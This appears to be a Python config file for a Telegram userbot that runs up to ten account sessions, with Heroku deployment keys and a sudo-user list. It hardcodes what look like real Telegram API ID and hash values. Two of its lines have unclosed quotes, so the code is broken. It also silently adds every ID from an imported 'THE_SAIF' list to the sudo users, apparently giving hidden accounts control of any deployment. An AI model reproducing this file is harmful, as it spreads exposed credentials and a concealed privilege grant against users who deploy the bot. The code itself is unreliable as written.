from os import getenv
from data import THE_SAIF


#----------------------------------- REQUIRED CODES --------------------------------------#

API_ID = int(getenv("API_ID", "25899888)
API_HASH = getenv("API_HASH", "125b1d5e3277ab423dc98bbab94f9941)
SESSION1 = getenv("SESSION")
ALIVE_PIC = getenv("ALIVE_PIC", "https://telegra.ph/file/dafe713ade60212c37933.jpg")
OWNER_ID = int(getenv("OWNER_ID", "6697540778"))
HEROKU_APP_NAME = getenv("HEROKU_APP_NAME")
HEROKU_API_KEY = getenv("HEROKU_API_KEY")


#-------------------------------- OPTIONAL -------------------------------------#

SESSION2 = getenv("SESSION2")
SESSION3 = getenv("SESSION3")
SESSION4 = getenv("SESSION4")
SESSION5 = getenv("SESSION5")
SESSION6 = getenv("SESSION6")
SESSION7 = getenv("SESSION7")
SESSION8 = getenv("SESSION8")
SESSION9 = getenv("SESSION9")
SESSION10 = getenv("SESSION10")

SUDO_USERS = list(map(lambda x: int(x), getenv("SUDO_USERS", "6585111267").split(" ")))
SUDO_USERS.append(OWNER_ID)

for x in THE_SAIF:
    SUDO_USERS.append(x)

SESSIONS = [SESSION1, SESSION2, SESSION3, SESSION4, SESSION5, SESSION6, SESSION7, SESSION8, SESSION9, SESSION10]
